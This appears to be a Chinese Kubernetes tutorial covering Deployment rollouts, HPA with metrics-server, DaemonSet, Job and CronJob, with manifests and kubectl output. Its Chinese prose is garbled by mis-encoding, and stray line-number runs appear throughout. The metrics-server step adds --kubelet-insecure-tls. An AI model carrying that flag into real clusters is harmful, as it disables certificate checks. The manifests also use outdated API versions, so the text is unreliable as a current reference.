dev\ndeployment.apps/pc-deployment image updated\ndeployment.apps/pc-deployment paused\n\n#è§å¯æ´æ°ç¶æ\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n devã\nWaiting for deployment "pc-deployment" rollout to finish: 2 out of 4 new replicas have been updated...\n\n# çæ§æ´æ°çè¿ç¨ï¼å¯ä»¥çå°å·²ç»æ°å¢äºä¸ä¸ªèµæºï¼ä½æ¯å¹¶æªæç§é¢æçç¶æå»å é¤ä¸ä¸ªæ§çèµæºï¼å°±æ¯å ä¸ºä½¿ç¨äºpauseæåå½ä»¤\n\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         \npc-deployment-5d89bdfbf9   3         3         3       19m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       14m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   2         2         2       3m16s   nginx        nginx:1.17.4   \n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-5d89bdfbf9-rj8sq   1/1     Running   0          7m33s\npc-deployment-5d89bdfbf9-ttwgg   1/1     Running   0          7m35s\npc-deployment-5d89bdfbf9-v4wvc   1/1     Running   0          7m34s\npc-deployment-6c9f56fcfb-996rt   1/1     Running   0          3m31s\npc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          3m31s\n\n# ç¡®ä¿æ´æ°çpodæ²¡é®é¢äºï¼ç»§ç»­æ´æ°\n[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n dev\ndeployment.apps/pc-deployment resumed\n\n# æ¥çæåçæ´æ°æåµ\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         \npc-deployment-5d89bdfbf9   0         0         0       21m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       16m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   4         4         4       5m11s   nginx        nginx:1.17.4   \n\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6c9f56fcfb-7bfwh   1/1     Running   0          37s\npc-deployment-6c9f56fcfb-996rt   1/1     Running   0          5m27s\npc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          5m27s\npc-deployment-6c9f56fcfb-rf84v   1/1     Running   0          37s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nå é¤ Deployment\n\n# å é¤deploymentï¼å¶ä¸çrsåpodä¹å°è¢«å é¤\n[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yaml\ndeployment.apps "pc-deployment" deleted\n\n\n1\n2\n3\n\n\n\n# Horizontal Pod Autoscaler(HPA)\n\nå¨åé¢çè¯¾ç¨ä¸­ï¼æä»¬å·²ç»å¯ä»¥å®ç°éè¿æå·¥æ§è¡ kubectl scale å½ä»¤å®ç° Pod æ©å®¹æç¼©å®¹ï¼ä½æ¯è¿æ¾ç¶ä¸ç¬¦å Kubernetes çå®ä½ç®æ  -- èªå¨åãæºè½åã Kubernetes ææå¯ä»¥å®ç°éè¿çæµ Pod çä½¿ç¨æåµï¼å®ç° pod æ°éçèªå¨è°æ´ï¼äºæ¯å°±äº§çäº Horizontal Pod Autoscalerï¼HPAï¼è¿ç§æ§å¶å¨ã\n\nHPA å¯ä»¥è·åæ¯ä¸ª Pod å©ç¨çï¼ç¶åå HPA ä¸­å®ä¹çææ è¿è¡å¯¹æ¯ï¼åæ¶è®¡ç®åºéè¦ä¼¸ç¼©çå·ä½å¼ï¼æåå®ç° Pod çæ°éçè°æ´ãå¶å® HPA ä¸ä¹åç Deployment ä¸æ ·ï¼ä¹å±äºä¸ç§ Kubernetes èµæºå¯¹è±¡ï¼å®éè¿è¿½è¸ªåæ RC æ§å¶çææç®æ  Pod çè´è½½ååæåµï¼æ¥ç¡®å®æ¯å¦éè¦éå¯¹æ§å°è°æ´ç®æ  Pod çå¯æ¬æ°ï¼è¿æ¯ HPA çå®ç°åçã\n\n\n\n1 å®è£ metrics-server\nmetrics-server å¯ä»¥ç¨æ¥æ¶ééç¾¤ä¸­çèµæºä½¿ç¨æåµ\n\n# å®è£git\n[root@k8s-master01 ~]# yum install git -y\n# è·åmetrics-server, æ³¨æä½¿ç¨ççæ¬\n[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server\n# ä¿®æ¹deployment, æ³¨æä¿®æ¹çæ¯éåååå§ååæ°\n[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/\n[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml\næå¾ä¸­æ·»å ä¸é¢éé¡¹\nhostNetwork: true\nimage: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6\nargs:\n- --kubelet-insecure-tls\n- --kubelet-preferred-address-types=InternalIP,Hostname,InternalDNS,ExternalDNS,ExternalIP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n\n# å®è£metrics-server\n[root@k8s-master01 1.8+]# kubectl apply -f ./\n\n# æ¥çpodè¿è¡æåµ\n[root@k8s-master01 1.8+]# kubectl get pod -n kube-system\nmetrics-server-6b976979db-2xwbj   1/1     Running   0          90s\n\n# ä½¿ç¨kubectl top node æ¥çèµæºä½¿ç¨æåµ\n[root@k8s-master01 1.8+]# kubectl top node\nNAME           CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%\nk8s-master01   289m         14%    1582Mi          54%       \nk8s-node01     81m          4%     1195Mi          40%       \nk8s-node02     72m          3%     1211Mi          41%  \n[root@k8s-master01 1.8+]# kubectl top pod -n kube-system\nNAME                              CPU(cores)   MEMORY(bytes)\ncoredns-6955765f44-7ptsb          3m           9Mi\ncoredns-6955765f44-vcwr5          3m           8Mi\netcd-master                       14m          145Mi\n...\n# è³æ­¤,metrics-serverå®è£å®æ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n2 åå¤ deployment å servie\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  strategy: # ç­ç¥\n    type: RollingUpdate # æ»å¨æ´æ°ç­ç¥\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        resources: # èµæºéé¢\n          limits:  # éå¶èµæºï¼ä¸éï¼\n            cpu: "1" # CPUéå¶ï¼åä½æ¯coreæ°\n          requests: # è¯·æ±èµæºï¼ä¸éï¼\n            cpu: "100m"  # CPUéå¶ï¼åä½æ¯coreæ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# åå»ºservice\n[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=NodePort --port=80 -n dev\n\n\n1\n2\n\n\n# æ¥ç\n[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n dev\nNAME                    READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/nginx   1/1     1            1           47s\n\nNAME                         READY   STATUS    RESTARTS   AGE\npod/nginx-7df9756ccc-bh8dr   1/1     Running   0          47s\n\nNAME            TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE\nservice/nginx   NodePort   10.101.18.29   <none>        80:31830/TCP   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n3 é¨ç½² HPA\nåå»º pc-hpa.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: autoscaling/v1\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: pc-hpa\n  namespace: dev\nspec:\n  minReplicas: 1  #æå°podæ°é\n  maxReplicas: 10 #æå¤§podæ°é\n  targetCPUUtilizationPercentage: 3 # CPUä½¿ç¨çææ ï¼3%ï¼\n  scaleTargetRef:   # æå®è¦æ§å¶çnginxä¿¡æ¯\n    apiVersion: apps/v1\n    kind: Deployment\n    name: nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºhpa\n[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yaml\nhorizontalpodautoscaler.autoscaling/pc-hpa created\n\n# æ¥çhpa\n    [root@k8s-master01 1.8+]# kubectl get hpa -n dev\nNAME     REFERENCE          TARGETS   MINPODS   MAXPODS   REPLICAS   AGE\npc-hpa   Deployment/nginx   0%/3%     1         10        1          62s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n4 æµè¯\nä½¿ç¨åæµå·¥å·å¯¹ service å°å 192.168.5.4:31830 è¿è¡åæµï¼ç¶åéè¿æ§å¶å°æ¥ç hpa å pod çåå\nhpa åå\n\n[root@k8s-master01 ~]# kubectl get hpa -n dev -w\nNAME   REFERENCE      TARGETS  MINPODS  MAXPODS  REPLICAS  AGE\npc-hpa  Deployment/nginx  0%/3%   1     10     1      4m11s\npc-hpa  Deployment/nginx  0%/3%   1     10     1      5m19s\npc-hpa  Deployment/nginx  22%/3%   1     10     1      6m50s\npc-hpa  Deployment/nginx  22%/3%   1     10     4      7m5s\npc-hpa  Deployment/nginx  22%/3%   1     10     8      7m21s\npc-hpa  Deployment/nginx  6%/3%   1     10     8      7m51s\npc-hpa  Deployment/nginx  0%/3%   1     10     8      9m6s\npc-hpa  Deployment/nginx  0%/3%   1     10     8      13m\npc-hpa  Deployment/nginx  0%/3%   1     10     1      14m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\ndeployment åå\n\n[root@k8s-master01 ~]# kubectl get deployment -n dev -w\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   1/1     1            1           11m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     4            1           13m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     8            1           14m\nnginx   2/8     8            2           14m\nnginx   3/8     8            3           14m\nnginx   4/8     8            4           14m\nnginx   5/8     8            5           14m\nnginx   6/8     8            6           14m\nnginx   7/8     8            7           14m\nnginx   8/8     8            8           15m\nnginx   8/1     8            8           20m\nnginx   8/1     8            8           20m\nnginx   1/1     1            1           20m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\npod åå\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME                     READY   STATUS    RESTARTS   AGE\nnginx-7df9756ccc-bh8dr   1/1     Running   0          11m\nnginx-7df9756ccc-cpgrv   0/1     Pending   0          0s\nnginx-7df9756ccc-8zhwk   0/1     Pending   0          0s\nnginx-7df9756ccc-rr9bn   0/1     Pending   0          0s\nnginx-7df9756ccc-cpgrv   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-8zhwk   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-rr9bn   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     Pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     Pending             0          0s\nnginx-7df9756ccc-sl9c6   0/1     Pending             0          0s\nnginx-7df9756ccc-fgst7   0/1     Pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-sl9c6   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-fgst7   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-8zhwk   1/1     Running             0          19s\nnginx-7df9756ccc-rr9bn   1/1     Running             0          30s\nnginx-7df9756ccc-m9gsj   1/1     Running             0          21s\nnginx-7df9756ccc-cpgrv   1/1     Running             0          47s\nnginx-7df9756ccc-sl9c6   1/1     Running             0          33s\nnginx-7df9756ccc-g56qb   1/1     Running             0          48s\nnginx-7df9756ccc-fgst7   1/1     Running             0          66s\nnginx-7df9756ccc-fgst7   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-8zhwk   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-cpgrv   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-g56qb   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-rr9bn   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-m9gsj   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-sl9c6   1/1     Terminating         0          6m50s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# DaemonSet(DS)\n\nDaemonSet ç±»åçæ§å¶å¨å¯ä»¥ä¿è¯å¨éç¾¤ä¸­çæ¯ä¸å°ï¼ææå®ï¼èç¹ä¸é½è¿è¡ä¸ä¸ªå¯æ¬ãä¸è¬éç¨äºæ¥å¿æ¶éãèç¹çæ§ç­åºæ¯ãä¹å°±æ¯è¯´ï¼å¦æä¸ä¸ª Pod æä¾çåè½æ¯èç¹çº§å«çï¼æ¯ä¸ªèç¹é½éè¦ä¸åªéè¦ä¸ä¸ªï¼ï¼é£ä¹è¿ç±» Pod å°±éåä½¿ç¨ DaemonSet ç±»åçæ§å¶å¨åå»ºã\n\n\n\nDaemonSet æ§å¶å¨çç¹ç¹ï¼\n\n * æ¯å½åéç¾¤ä¸­æ·»å ä¸ä¸ªèç¹æ¶ï¼æå®ç Pod å¯æ¬ä¹å°æ·»å å°è¯¥èç¹ä¸\n * å½èç¹ä»éç¾¤ä¸­ç§»é¤æ¶ï¼Pod ä¹å°±è¢«åå¾åæ¶äº\n\nä¸é¢åæ¥çä¸ DaemonSet çèµæºæ¸åæä»¶\n\napiVersion: apps/v1 # çæ¬å·\nkind: DaemonSet # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: daemonset\nspec: # è¯¦ææè¿°\n  revisionHistoryLimit: 3 # ä¿çåå²çæ¬\n  updateStrategy: # æ´æ°ç­ç¥\n    type: RollingUpdate # æ»å¨æ´æ°ç­ç¥\n    rollingUpdate: # æ»å¨æ´æ°\n      maxUnavailable: 1 # æå¤§ä¸å¯ç¨ç¶æç Pod çæå¤§å¼ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchLabels:      # Labelså¹éè§å\n      app: nginx-pod\n    matchExpressions: # Expressionså¹éè§å\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nåå»º pc-daemonset.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: DaemonSet      \nmetadata:\n  name: pc-daemonset\n  namespace: dev\nspec: \n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# åå»ºdaemonset\n[root@k8s-master01 ~]# kubectl create -f  pc-daemonset.yaml\ndaemonset.apps/pc-daemonset created\n\n# æ¥çdaemonset\n[root@k8s-master01 ~]#  kubectl get ds -n dev -o wide\nNAME        DESIRED  CURRENT  READY  UP-TO-DATE  AVAILABLE   AGE   CONTAINERS   IMAGES         \npc-daemonset   2        2        2      2           2        24s   nginx        nginx:1.17.1   \n\n# æ¥çpod,åç°å¨æ¯ä¸ªNodeä¸é½è¿è¡ä¸ä¸ªpod\n[root@k8s-master01 ~]#  kubectl get pods -n dev -o wide\nNAME                 READY   STATUS    RESTARTS   AGE   IP            NODE    \npc-daemonset-9bck8   1/1     Running   0          37s   10.244.1.43   node1     \npc-daemonset-k224w   1/1     Running   0          37s   10.244.2.74   node2      \n\n# å é¤daemonset\n[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yaml\ndaemonset.apps "pc-daemonset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# Job\n\nJobï¼ä¸»è¦ç¨äºè´è´£ ** æ¹éå¤ç (ä¸æ¬¡è¦å¤çæå®æ°éä»»å¡) ç­æçä¸æ¬¡æ§ (æ¯ä¸ªä»»å¡ä»è¿è¡ä¸æ¬¡å°±ç»æ)** ä»»å¡ãJob ç¹ç¹å¦ä¸ï¼\n\n * å½ Job åå»ºç pod æ§è¡æåç»ææ¶ï¼Job å°è®°å½æåç»æç pod æ°é\n * å½æåç»æç pod è¾¾å°æå®çæ°éæ¶ï¼Job å°å®ææ§è¡\n\n\n\nJob çèµæºæ¸åæä»¶ï¼\n\napiVersion: batch/v1 # çæ¬å·\nkind: Job # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: job\nspec: # è¯¦ææè¿°\n  completions: 1 # æå®jobéè¦æåè¿è¡Podsçæ¬¡æ°ãé»è®¤å¼: 1\n  parallelism: 1 # æå®jobå¨ä»»ä¸æ¶å»åºè¯¥å¹¶åè¿è¡Podsçæ°éãé»è®¤å¼: 1\n  activeDeadlineSeconds: 30 # æå®jobå¯è¿è¡çæ¶é´æéï¼è¶è¿æ¶é´è¿æªç»æï¼ç³»ç»å°ä¼å°è¯è¿è¡ç»æ­¢ã\n  backoffLimit: 6 # æå®jobå¤±è´¥åè¿è¡éè¯çæ¬¡æ°ãé»è®¤æ¯6\n  manualSelector: true # æ¯å¦å¯ä»¥ä½¿ç¨selectoréæ©å¨éæ©podï¼é»è®¤æ¯false\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchLabels:      # Labelså¹éè§å\n      app: counter-pod\n    matchExpressions: # Expressionså¹éè§å\n      - {key: app, operator: In, values: [counter-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartPolicy: Never # éå¯ç­ç¥åªè½è®¾ç½®ä¸ºNeveræèOnFailure\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n> å³äºéå¯ç­ç¥è®¾ç½®çè¯´æï¼\n> å¦ææå®ä¸º OnFailureï¼å job ä¼å¨ pod åºç°æéæ¶éå¯å®¹å¨ï¼èä¸æ¯åå»º podï¼failed æ¬¡æ°ä¸å\n> å¦ææå®ä¸º Neverï¼å job ä¼å¨ pod åºç°æéæ¶åå»ºæ°ç podï¼å¹¶ä¸æé pod ä¸ä¼æ¶å¤±ï¼ä¹ä¸ä¼éå¯ï¼failed æ¬¡æ°å  1\n> å¦ææå®ä¸º Always çè¯ï¼å°±æå³çä¸ç´éå¯ï¼æå³ç job ä»»å¡ä¼éå¤å»æ§è¡äºï¼å½ç¶ä¸å¯¹ï¼æä»¥ä¸è½è®¾ç½®ä¸º Always\n\nåå»º pc-job.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: batch/v1\nkind: Job      \nmetadata:\n  name: pc-job\n  namespace: dev\nspec:\n  manualSelector: true\n  selector:\n    matchLabels:\n      app: counter-pod\n  template:\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartPolicy: Never\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åå»ºjob\n[root@k8s-master01 ~]# kubectl create -f pc-job.yaml\njob.batch/pc-job created\n\n# æ¥çjob\n[root@k8s-master01 ~]# kubectl get job -n dev -o wide  -w\nNAME     COMPLETIONS   DURATION   AGE   CONTAINERS   IMAGES         SELECTOR\npc-job   0/1           21s        21s   counter      busybox:1.30   app=counter-pod\npc-job   1/1           31s        79s   counter      busybox:1.30   app=counter-pod\n\n# éè¿è§å¯podç¶æå¯ä»¥çå°ï¼podå¨è¿è¡å®æ¯ä»»å¡åï¼å°±ä¼åæCompletedç¶æ\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME           READY   STATUS     RESTARTS      AGE\npc-job-rxg96   1/1     Running     0            29s\npc-job-rxg96   0/1     Completed   0            33s\n\n# æ¥ä¸æ¥ï¼è°æ´ä¸podè¿è¡çæ»æ°éåå¹¶è¡æ°é å³ï¼å¨specä¸è®¾ç½®ä¸é¢ä¸¤ä¸ªéé¡¹\n#  completions: 6 # æå®jobéè¦æåè¿è¡Podsçæ¬¡æ°ä¸º6\n#  parallelism: 3 # æå®jobå¹¶åè¿è¡Podsçæ°éä¸º3\n#  ç¶åéæ°è¿è¡jobï¼è§å¯ææï¼æ­¤æ¶ä¼åç°ï¼jobä¼æ¯æ¬¡è¿è¡3ä¸ªpodï¼æ»å±æ§è¡äº6ä¸ªpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME           READY   STATUS    RESTARTS   AGE\npc-job-684ft   1/1     Running   0          5s\npc-job-jhj49   1/1     Running   0          5s\npc-job-pfcvh   1/1     Running   0          5s\npc-job-684ft   0/1     Completed   0          11s\npc-job-v7rhr   0/1     Pending     0          0s\npc-job-v7rhr   0/1     Pending     0          0s\npc-job-v7rhr   0/1     ContainerCreating   0          0s\npc-job-jhj49   0/1     Completed           0          11s\npc-job-fhwf7   0/1     Pending             0          0s\npc-job-fhwf7   0/1     Pending             0          0s\npc-job-pfcvh   0/1     Completed           0          11s\npc-job-5vg2j   0/1     Pending             0          0s\npc-job-fhwf7   0/1     ContainerCreating   0          0s\npc-job-5vg2j   0/1     Pending             0          0s\npc-job-5vg2j   0/1     ContainerCreating   0          0s\npc-job-fhwf7   1/1     Running             0          2s\npc-job-v7rhr   1/1     Running             0          2s\npc-job-5vg2j   1/1     Running             0          3s\npc-job-fhwf7   0/1     Completed           0          12s\npc-job-v7rhr   0/1     Completed           0          12s\npc-job-5vg2j   0/1     Completed           0          12s\n\n# å é¤job\n[root@k8s-master01 ~]# kubectl delete -f pc-job.yaml\njob.batch "pc-job" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# CronJob(CJ)\n\nCronJob æ§å¶å¨ä»¥ Job æ§å¶å¨èµæºä¸ºå¶ç®¡æ§å¯¹è±¡ï¼å¹¶åå©å®ç®¡ç pod èµæºå¯¹è±¡ï¼Job æ§å¶å¨å®ä¹çä½ä¸ä»»å¡å¨å¶æ§å¶å¨èµæºåå»ºä¹åä¾¿ä¼ç«å³æ§è¡ï¼ä½ CronJob å¯ä»¥ä»¥ç±»ä¼¼äº Linux æä½ç³»ç»çå¨ææ§ä»»å¡ä½ä¸è®¡åçæ¹å¼æ§å¶å¶è¿è¡æ¶é´ç¹åéå¤è¿è¡çæ¹å¼ãä¹å°±æ¯è¯´ï¼CronJob å¯ä»¥å¨ç¹å®çæ¶é´ç¹ (åå¤ç) å»è¿è¡ job ä»»å¡ã\n\n\n\nCronJob çèµæºæ¸åæä»¶ï¼\n\napiVersion: batch/v1beta1 # çæ¬å·\nkind: CronJob # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: cronjob\nspec: # è¯¦ææè¿°\n  schedule: # cronæ ¼å¼çä½ä¸è°åº¦è¿è¡æ¶é´ç¹,ç¨äºæ§å¶ä»»å¡å¨ä»ä¹æ¶é´æ§è¡\n  concurrencyPolicy: # å¹¶åæ§è¡ç­ç¥ï¼ç¨äºå®ä¹åä¸æ¬¡ä½ä¸è¿è¡å°æªå®ææ¶æ¯å¦ä»¥åå¦ä½è¿è¡åä¸æ¬¡çä½ä¸\n  failedJobHistoryLimit: # ä¸ºå¤±è´¥çä»»å¡æ§è¡ä¿ççåå²è®°å½æ°ï¼é»è®¤ä¸º1\n  successfulJobHistoryLimit: # ä¸ºæåçä»»å¡æ§è¡ä¿ççåå²è®°å½æ°ï¼é»è®¤ä¸º3\n  startingDeadlineSeconds: # å¯å¨ä½ä¸éè¯¯çè¶æ¶æ¶é¿\n  jobTemplate: # jobæ§å¶å¨æ¨¡æ¿ï¼ç¨äºä¸ºcronjobæ§å¶å¨çæjobå¯¹è±¡;ä¸é¢å¶å®å°±æ¯jobçå®ä¹\n    metadata:\n    spec:\n      completions: 1\n      parallelism: 1\n      activeDeadlineSeconds: 30\n      backoffLimit: 6\n      manualSelector: true\n      selector:\n        matchLabels:\n          app: counter-pod\n        matchExpressions: è§å\n          - {key: app, operator: In, values: [counter-pod]}\n      template:\n        metadata:\n          labels:\n            app: counter-pod\n        spec:\n          restartPolicy: Never \n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\néè¦éç¹è§£éçå ä¸ªéé¡¹ï¼\nschedule: cronè¡¨è¾¾å¼ï¼ç¨äºæå®ä»»å¡çæ§è¡æ¶é´\n    */1    *      *    *     *\n    <åé> <å°æ¶> <æ¥> <æä»½> <ææ>\n\n    åé å¼ä» 0 å° 59.\n    å°æ¶ å¼ä» 0 å° 23.\n    æ¥ å¼ä» 1 å° 31.\n    æ å¼ä» 1 å° 12.\n    ææ å¼ä» 0 å° 6, 0 ä»£è¡¨æææ¥\n    å¤ä¸ªæ¶é´å¯ä»¥ç¨éå·éå¼ï¼ èå´å¯ä»¥ç¨è¿å­ç¬¦ç»åºï¼*å¯ä»¥ä½ä¸ºééç¬¦ï¼ /è¡¨ç¤ºæ¯...\nconcurrencyPolicy: æ¯å¦aä»»å¡1åéè¿è¡ä¸æ¬¡ï¼å¯æ¯aä»»å¡æ¬æ¬¡è¿è¡äºè¶è¿1åéï¼é£ä¹æ¯å¦åè®¸è®©ä¸ä¸ªå¨æçä»»å¡è¿è¡ï¼\n    Allow:   åè®¸Jobså¹¶åè¿è¡(é»è®¤)\n    Forbid:  ç¦æ­¢å¹¶åè¿è¡ï¼å¦æä¸ä¸æ¬¡è¿è¡å°æªå®æï¼åè·³è¿ä¸ä¸æ¬¡è¿è¡\n    Replace: æ¿æ¢ï¼åæ¶å½åæ­£å¨è¿è¡çä½ä¸å¹¶ç¨æ°ä½ä¸æ¿æ¢å®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º pc-cronjob.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pc-cronjob\n  namespace: dev\n  labels:\n    controller: cronjob\nspec:\n  schedule: "*/1 * * * *"\n  jobTemplate:\n    metadata:\n    spec:\n      template:\n        spec:\n          restartPolicy: Never\n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# åå»ºcronjob\n[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yaml\ncronjob.batch/pc-cronjob created\n\n# æ¥çcronjob\n[root@k8s-master01 ~]# kubectl get cronjobs -n dev\nNAME         SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGE\npc-cronjob   */1 * * * *   False     0        <none>          6s\n\n# æ¥çjob\n[root@k8s-master01 ~]# kubectl get jobs -n dev\nNAME                    COMPLETIONS   DURATION   AGE\npc-cronjob-1592587800   1/1           28s        3m26s\npc-cronjob-1592587860   1/1           28s        2m26s\npc-cronjob-1592587920   1/1           28s        86s\n\n# æ¥çpod\n[root@k8s-master01 ~]# 